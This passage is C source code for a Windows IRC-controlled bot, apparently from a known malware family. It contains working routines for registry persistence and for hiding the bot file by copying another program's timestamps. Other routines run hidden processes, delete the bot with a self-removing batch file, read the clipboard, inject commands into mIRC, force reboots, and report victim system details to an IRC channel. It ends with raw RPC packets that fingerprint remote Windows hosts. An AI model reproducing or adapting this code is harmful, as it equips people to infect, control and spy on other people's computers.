	char *nfilename = (char *)param;

	while (1) {
		AutoStartRegs(nfilename);
		Sleep(registry_delay);
	}
	return 0;
}
#endif

BOOL PrivateIP(const char *ip)
{	
	if (ip) {
		if (strcmp(ip, "") != 0) {
			char *token, ipbuf[32]; 	
			strncpy(ipbuf, ip, sizeof(ipbuf)); 
			if ((token=strtok(ipbuf, ".")) != NULL) { 
				int ip1 = atoi(token);
				if ((token=strtok(NULL, ".")) != NULL) {
					int ip2 = atoi(token);

					if ((ip1 == 10)									// Class A Private Network
						|| (ip1 == 172 && ip2 > 15 && ip2 < 32)	// Class B Private Network
						|| (ip1 == 192 && ip2 == 168))				// Class C Private Network
						//|| (ip1 == 90 && ip2 == 0))					// Undefined Network Range
						return TRUE;
				}
			}
		}
	}
	return FALSE; 
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}


char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	unsigned short answer = 0;
	register unsigned short *w = addr;
	register int nleft = len;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}




char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

// This will change x0A & x0D into x00 and return line pointers in saveArray[].
int Split(char *inStr, void *saveArray)
{
	int i,j,index=0;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;

	lines[index++]=inStr;
	for (i=0;i < j;i++) 
		if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) 
			inStr[i]='\x0';

	//Now that all cr/lf have been converted to NULL, save the pointers...
	for (i=0;i < j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			if (index < MAX_LINES) 
				lines[index++] = &inStr[i+1]; 
			else 
				break;
		}
	}

	if (saveArray!=0) 
		memcpy(saveArray,lines,sizeof(lines));

	return index;
}

void initskip(char *s, int len, int skip[1024])
{
	int i, j;

	for (i = 0; i < MAXSTRLEN; i++)
		skip[i] = len;
	for (j = 0; j <= len - 1; j++)
		skip[lstrindex(s[j])] = len - j - 1;

	return;
}

int lstrindex(char c)
{
	char d = tolower(c);

	if (d >= 'a' && d <= 'z')
		return (d - 'a' + 1);
	else
		return 0;
}

char *lstrstr(char *s, char *t)
{
	int i, j, k, slen=strlen(s), tlen=strlen(t);
	int skip[1024];

	initskip(t, tlen, skip);

	for (i = j = tlen - 1; j > 0; i--, j--) {
		while (tolower(s[i]) != tolower(t[j])) {
			k = skip[lstrindex(s[i])];
			i += (tlen - j > k) ? tlen - j : k;
			if (i >= slen)
				return NULL;
			j = tlen - 1;
		}
	}
	return (s + i);
}

char *PrintError(char *msg)
{
	TCHAR sysMsg[256];
	static char buffer[IRCLINE];

	DWORD err = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysMsg, 256, NULL);

	TCHAR *p = sysMsg;
	while((*p > 31) || (*p == 9))
		++p;
	do
		*p-- = 0; 
	while((p >= sysMsg) && ((*p == '.') || (*p < 33)));

	_snprintf(buffer,sizeof(buffer),"%s Error: %s <%d>.",msg,sysMsg,err);

	return (buffer);
}

char *GetClipboardText(void) 
{
	if (fOpenClipboard(NULL)) {
		HANDLE hData = fGetClipboardData(CF_TEXT);
		if (!hData) 
			return 0;
		char * buffer = (char*)GlobalLock(hData);

		GlobalUnlock(hData);
		fCloseClipboard();

		return buffer;
	}

	return 0;
}

BOOL mirccmd(char *cmd)
{
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		sprintf(mData, cmd);
		fSendMessage(mwnd,WM_USER + 200,1,0);
		fSendMessage(mwnd,WM_USER + 201,1,0);
		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

		return TRUE;
	 }
	else
		return FALSE;
}

void SetFileTime(char *Filename)
{
	FILETIME aFileTime, bFileTime, cFileTime;

	char exepath[MAX_PATH];
	if(fSearchPath(NULL,"explorer.exe",NULL,sizeof(exepath),exepath,NULL) == 0)
		return;  

	HANDLE hTimeFile = CreateFile(exepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE) {
			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
	}

	return;
}

DWORD CreateProc(char *file, char *param)
{	
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); 
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;

	char cmdline[1024];
	_snprintf(cmdline,sizeof(cmdline),"%s %s",file, param);

	if (CreateProcess(file, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == 0)
		return 0; 

	return (pinfo.dwProcessId); 
}

BOOL Reboot(void)
{
	AdjustPrivileges(SE_SHUTDOWN_NAME, TRUE);

	if (!fExitWindowsEx(EWX_SYSTEM_REBOOT /* or EWX_FORCE_SHUTDOWN */, SHUTDOWN_SYSTEM_HUNG))
		return FALSE;

	return TRUE;
}

void uninstall(void)
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs(filename);

	killthreadall();
	
	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
	
	return;
}
// globals
extern FILE *fp;

// irc send functions
void irc_sendv(SOCKET sock, char *msg, ...)
{
	char msgbuf[IRCLINE];

	va_list argp;
	va_start(argp, msg); 
	_vsnprintf(msgbuf, sizeof(msgbuf), msg, argp);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	return;
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay)
{
	char msgbuf[IRCLINE], tmpbuf[IRCLINE], *action;

	if (notice) 
		action = "NOTICE"; 
	else 
		action = "PRIVMSG";

	int bufsize = IRCLINE - strlen(action) - strlen(dest) - 6 ; // trust me
	_snprintf(tmpbuf,bufsize,"%s",msg);
	sprintf(msgbuf,"%s %s :%s\r\n", action, dest, tmpbuf);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	if(delay)
		Sleep(FLOOD_DELAY);

	return;
}
/////////////////////////////////////////////////////////////////////////
#ifndef NO_IDENT

DWORD WINAPI IdentThread(LPVOID param)
{
	char user[12], buffer[IRCLINE];

	int threadnum = (int)param;
	BOOL success = FALSE;

	SOCKET ssock,csock;

	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)113);
	ssin.sin_addr.s_addr=INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		threads[threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (flisten(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);

				while (1) {
					if ((csock = faccept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;

					sprintf(buffer, "[IDENTD]: Client connection from IP: %s:%d.", finet_ntoa(csin.sin_addr), csin.sin_port);
					addlog(buffer);

					if (frecv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);

						memset(user, 0, sizeof(user));
						_snprintf(buffer,sizeof(buffer)," : USERID : UNIX : %s\r\n",rndnick(user, LETTERNICK, FALSE));
	
						if (fsend(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;

					}
				}
			}
		}
	}

	if (!success) {
		sprintf(buffer, "[IDENTD]: Error: server failed, returned: <%d>.", fWSAGetLastError());
		addlog(buffer);
	}

	fclosesocket(ssock);
	fclosesocket(csock);
	clearthread(threadnum);

	ExitThread(0);
}
#endif

//////////////////////////////////////////////////////////////////////////////////////////////

#ifndef NO_EHANDLER

// globals
DWORD scratch;

EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
	void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext)
{	

	// do some clean-up
	fclosesocket(threads[0].sock);
	killthreadall();
	fWSACleanup();
	fWSACleanup();
	Sleep(100);
	
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	#ifdef DEBUG_CONSOLE
	sinfo.wShowWindow = SW_SHOW;
	#else
	sinfo.wShowWindow = SW_HIDE;
	#endif
		
	char botfile[MAX_PATH],sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	if (CreateProcess(NULL, botfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
		Sleep(100);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}

	// Change EAX in the context record so that it points to someplace
	// where we can successfully write
	ContextRecord->Eax = (DWORD)&scratch;

	_asm
	{                           // Remove our EXECEPTION_REGISTRATION record
		mov     eax,[ESP]       // Get pointer to previous record
		mov     FS:[0], EAX     // Install previous record
		add     esp, 8          // Clean our EXECEPTION_REGISTRATION off stack
	}

	ExitProcess(0);

	// Tell the OS to restart the faulting instruction
	return ExceptionContinueExecution;
}
#endif

////////////////////// SYSTEM INFO ///////////////////////////


char *Uptime(int startup)
{
	static char buffer[50];

	DWORD total = GetTickCount() / 1000 - startup;
	DWORD days = total / 86400;
	DWORD hours = (total % 86400) / 3600;
	DWORD minutes = ((total % 86400) % 3600) / 60;
	
	_snprintf(buffer, sizeof(buffer), "%dd %dh %dm", days, hours, minutes);

	return (buffer);
}

int OSVersionCheck(void)
{ 
	DWORD dwRet = OS_UNKNOWN;

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&verinfo)) {
		if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwRet = OS_WIN95;
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) dwRet = OS_WINNT;
		}
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) dwRet = OS_WIN98;
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) dwRet = OS_WINME;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) dwRet = OS_WIN2K;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) dwRet = OS_WINXP;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) dwRet = OS_WIN2K3;
		else dwRet = OS_UNKNOWN;
	} else 
		dwRet = OS_UNKNOWN;

	return (dwRet);
}

#ifndef NO_SYSINFO

// asm for cpuspeed() (used for counting cpu cycles)
#pragma warning( disable : 4035 )
inline unsigned __int64 GetCycleCount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning( default : 4035 )

// cpu speed function
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}

// function used for sysinfo
char *sysinfo(char *sinfo, SOCKET sock)
{
	char *os="", os2[140];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}

	DWORD cchBuff = 256; // check this, could be sizeof CurrentUser
	char CurrentUser[256]="?";
	if(fGetUserName)
		fGetUserName(CurrentUser, &cchBuff);

	char hostname[250];
	DWORD addr = finet_addr(GetIP(sock));  
	HOSTENT *hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       sprintf(hostname,hostent->h_name);
    else 
		sprintf(hostname,"couldn't resolve host");

	char sysdir[MAX_PATH];
    GetSystemDirectory(sysdir,sizeof(sysdir));

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	MEMORYSTATUS memstat;
	memset(&memstat, 0, sizeof(memstat));
	GlobalMemoryStatus(&memstat); // load memory info into memstat

	char drive[10];
	_splitpath(sysdir, drive, NULL, NULL, NULL);
	DKSPKB dkspkb=DiskSpaceKB(drive);

	_snprintf(sinfo, IRCLINE, "[SYSINFO]: [CPU]: %I64uMHz. [RAM]: %sKB total, %sKB free. [Disk]: %s total, %s free. [OS]: Windows %s (%d.%d, Build %d). [Sysdir]: %s. [Hostname]: %s (%s). [Current User]: %s. [Date]: %s. [Time]: %s. [Uptime]: %s.",
		GetCPUSpeed(), commaI64(memstat.dwTotalPhys / 1024), commaI64(memstat.dwAvailPhys / 1024), dkspkb.TotalKB, dkspkb.FreeKB, os, 
		verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, sysdir, hostname, GetIP(sock), CurrentUser, date, time, Uptime());

	return (sinfo); // return the sysinfo string
}
#endif

#ifndef NO_NETINFO

// function used for netinfo
char *netinfo(char *ninfo, char *host, SOCKET sock)
{
	DWORD n;
	char ctype[8], cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) 
			sprintf(ctype, "Dial-up");
	 	else 
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	_snprintf(ninfo, IRCLINE, "[NETINFO]: [Type]: %s (%s). [IP Address]: %s. [Hostname]: %s.", ctype, cname, GetIP(sock), host);

	return (ninfo); // return the netinfo string
}
#endif

////////////////////////////// DRIVE INFO //////////////////////////////////

BOOL FileExists(char *filename, int mode) 
{ 
	return (_access(filename, mode) != -1);
} 

const char *commaI64(unsigned __int64 number)
{
	const int size = 50;
	int counter = 0;

	static char str[size];
	memset(str, 0, sizeof(str));

	char tempStr[size];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return (str);
}

const char *DriveType(LPCSTR Drive)
{
	switch(fGetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}

DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;

	if (fGetDiskFreeSpaceEx)
		fGetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);

	return (dksp);
}

DKSPKB DiskSpaceKB(LPCSTR Drive)
{
	DKSPKB dkspkb;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspkb.AvailableKB, "failed");
		sprintf(dkspkb.FreeKB, "failed");
		sprintf(dkspkb.TotalKB, "failed");
	} else {
		_snprintf(dkspkb.AvailableKB,sizeof(dkspkb.AvailableKB),"%sKB",commaI64(dksp.AvailableBytes/1024));
		_snprintf(dkspkb.FreeKB,sizeof(dkspkb.FreeKB),"%sKB",commaI64(dksp.FreeBytes/1024));
		_snprintf(dkspkb.TotalKB,sizeof(dkspkb.TotalKB),"%sKB",commaI64(dksp.TotalBytes/1024));
	}

	return (dkspkb);
}

void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	char sendbuf[IRCLINE];

	DKSPKB dkspkb=DiskSpaceKB(Drive);

	if (strcmp(dkspkb.TotalKB,"failed") == 0)
		_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: %s Drive (%s): Failed to stat, device not ready.", DriveType(Drive), Drive);
	else
		_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: %s Drive (%s): %s total, %s free, %s available.", DriveType(Drive), Drive, dkspkb.TotalKB, dkspkb.FreeKB, dkspkb.AvailableKB);
	irc_privmsg(sock, chan, sendbuf, notice, TRUE); 
//	addlog(sendbuf);

	return;
}

void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	if (Drive) {
		DriveSpace(sock, chan, notice, Drive);
	} else {
		DWORD dwSize = fGetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		fGetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0)
				DriveSpace(sock, chan, notice, pszDrv);
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return;
}

/////////////////////// THREADS /////////////////////////////
// function to add description to thread list and return thread number
int addthread(char *name, int id, SOCKET sock)
{
	int i;
	for (i = 0; i < MAXTHREADS; i++) {
		if (threads[i].name[0] == '\0') {
			strncpy(threads[i].name, name, sizeof(threads[i].name)-1);
			threads[i].id=id;
			threads[i].parent=0;
			threads[i].pid=0;
			threads[i].sock=sock;
			threads[i].nick[0]='\0';
			break;
		}
	}
	return i;
}

DWORD WINAPI ListThread(LPVOID param) 
{
	TLIST tlist = *((TLIST *)param);
	TLIST *tlistp = (TLIST *)param;
	tlistp->gotinfo = TRUE;

	listthreads(tlist.sock,tlist.chan,tlist.notice,tlist.full);
		
	clearthread(tlist.threadnum);

	ExitThread(0);
}

void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "-[Thread List]-", notice);
	for (int i = 0; i < MAXTHREADS; i++) {
		if (threads[i].name[0] != '\0' && (full || threads[i].parent == 0)) {
			sprintf(buffer, "%d. %s", i, threads[i].name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
	}

	return;
}

BOOL killthread(int threadnum)
{
	BOOL threadkilled = FALSE;
				
	if ((threadnum>0) && (threadnum<MAXTHREADS)) {
		TerminateThread(threads[threadnum].tHandle, 0);
		if (threads[threadnum].tHandle != 0) 
			threadkilled = TRUE;

		threads[threadnum].tHandle = 0;
		threads[threadnum].id = 0;
		threads[threadnum].parent = 0;

		if(threads[threadnum].pid > 0)
			killProcess(threads[threadnum].pid);
		threads[threadnum].pid = 0; 
		
		threads[threadnum].name[0] = '\0';
		threads[threadnum].nick[0] = '\0';

		fclosesocket(threads[threadnum].sock);
		threads[threadnum].sock = 0;
		fclosesocket(threads[threadnum].csock);
		threads[threadnum].csock = 0;
	}

	return (threadkilled);
}

int killthreadall(void)
{
	int numthreads=0;

	for (int i = 0; i < MAXTHREADS; i++)
		if (threads[i].name[0] != '\0')
			if (killthread(i))
				numthreads++;

	return (numthreads);
}

int killthreadid(int threadid, int threadnum)
{
	int numthreads=0;

	for (int i=0;i<MAXTHREADS;i++) {
		if (threads[i].id == threadid) {
			if (threadnum > 0) {
				if (threads[i].parent == threadnum || i == threadnum)
					if (killthread(i)) 
						numthreads++;
			} else {
				if (killthread(i)) 
					numthreads++;
			}
		}
	}

	return (numthreads);
}

int findthreadid(int threadid)
{
	int numthreads=0;

	for (int i=0;i<MAXTHREADS;i++)
		if (threads[i].id == threadid)
			numthreads++;

	return (numthreads);
}

int findthreadnum(int threadid)
{
	int threadnum=0;

	for (int i=0;i<MAXTHREADS;i++)
		if (threads[i].id == threadid) {
			threadnum=i;
			break;
		}

	return (threadnum);
}

void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread)
{
	char sendbuf[IRCLINE];
	int threadnum=0, i;

	if(thread)
		threadnum=atoi(thread);

	if ((i=killthreadid(threadid,threadnum)) > 0)
		sprintf(sendbuf,"%s: %s stopped. (%d thread(s) stopped.)", name, desc, i);
	else
		sprintf(sendbuf,"%s: No %s thread found.", name, desc);
	if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
//	addlog(sendbuf);

	return;
}

void clearthread(int threadnum)
{
	threads[threadnum].tHandle = 0;
	threads[threadnum].id=0;
	threads[threadnum].parent=0;
	threads[threadnum].pid=0;
	threads[threadnum].sock=0;
	threads[threadnum].csock=0;
	threads[threadnum].name[0]='\0';
	threads[threadnum].nick[0]='\0';

	return;
}

/////////////// FPHOST //////////////////////////////////
char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];
	    
			int iRetVal=OS_UNKNOWN;
			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;
	    
			SOCKADDR_IN ssin; 
			memset(&ssin, 0, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(135); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {	
				iErr=fsend(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {	
					iErr=fsend(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {	
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {	
							if(iErr<300) 
								iRetVal=OS_WINNT; 
							else 
								iRetVal=OS_WIN2K; 
						} else 
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
